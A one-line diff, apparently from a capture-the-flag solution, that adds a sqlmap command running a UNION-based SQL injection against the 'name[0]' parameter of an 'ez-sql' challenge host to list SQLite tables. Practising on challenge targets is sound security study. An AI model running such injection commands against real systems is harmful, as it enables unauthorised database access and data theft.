@@ -1,0 +1,1 @@
+sqlmap -u "https://ez-sql-3a83a28d9154ad0a.tjc.tf//search?name[0]=lol&name[1]=2" -p "name[0]" --dbms=sqlite --tables --technique=U
